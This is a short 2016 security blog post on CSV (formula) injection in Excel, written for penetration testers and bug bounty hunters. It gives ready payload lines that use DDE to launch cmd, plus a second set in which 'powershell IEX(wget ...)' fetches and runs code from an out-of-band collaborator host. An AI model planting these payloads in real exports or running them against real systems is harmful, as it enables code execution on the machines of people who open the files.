---
layout: post
title:  "CSV Injection"
description: ""
date:   2016-12-03 18:04:58 +0000
categories: [CSV, Attack vectors, Test files, Mental notes]
---

CSV injection is the technique to leverage the fact that Excel executes the formulas embedded in a [CSV][wiki-csv]. The technique has been [covered][contextis] by [plenty][securelayer7] of [others][zsec-dangers-mitigation], and even used successfully in [bug][hackerone-hackerone] [bounties][zsec-pornhub], so I will not repeat myself.

### Test files

The following is the simplest test file for testing all the vulnerable characters:

```
=cmd|' /C echo = && pause'!A0,CSV injection
@SUM(1+1)*cmd|' /C echo @ && pause'!A0,CSV injection
+2+3+cmd|' /C echo + && pause'!A0,CSV injection
-2+3+cmd|' /C echo - && pause'!A0,CSV injection
```

Pro tip, use Burp collaborator manual client with a combination of PowerShell and wget to verify if the payload gets executed on the server:

```
=cmd|' /C powershell IEX(wget <uniqueid>.collabserver.com)'!A0,CSV injection
@SUM(1+1)*cmd|' /C powershell IEX(wget <uniqueid>.collabserver.com)'!A0,CSV injection
+2+3+cmd|' /C powershell IEX(wget <uniqueid>.collabserver.com)'!A0,CSV injection
-2+3+cmd|' /C powershell IEX(wget <uniqueid>.collabserver.com)'!A0,CSV injection
```

### Likelihood

As always, this requires that the eight planets is aligned to work. First of, the injection has to be echoed in the CSV file unencoded, and then the victim has to download the file and open it in Excel. Excel gives the user multiple warning messages before the code gets executed, and of course the success heavily relies on the payload being executed.

[//]: ### Impact

[//]: ### Remediation

### References
* [Wikipedia: CSV][wiki-csv]
* [Context: Comma Separated Vulnerabilities][contextis]
* [OWASP: CSV Excel Macro Injection][owasp]
* [SecureLayer7: Everything about the CSV Excel Macro Injection][securelayer7]
* [ZeroSec: CSV Injection Revisited - Making Things More Dangerous(and fun)][zsec-dangers-mitigation]
* [ZeroSec: CSV Injection -> Meterpreter on Pornhub][zsec-pornhub]
* [hackeone: CSV Injection with the CVS export feature][hackerone-hackerone]

[wiki-csv]: https://en.wikipedia.org/wiki/Comma-separated_values
[owasp]: https://www.owasp.org/index.php/CSV_Excel_Macro_Injection
[contextis]: https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
[zsec-dangers-mitigation]: http://blog.zsec.uk/csv-dangers-mitigations/
[zsec-pornhub]: http://blog.zsec.uk/csvhub/
[hackerone-hackerone]: https://hackerone.com/reports/72785
[hackerone-pornhub]: https://hackerone.com/reports/146593
[xpnsec]: https://xpnsec.tumblr.com/post/133298850231/from-csv-to-meterpreter
[securelayer7]: http://blog.securelayer7.net/how-to-perform-csv-excel-macro-injection/
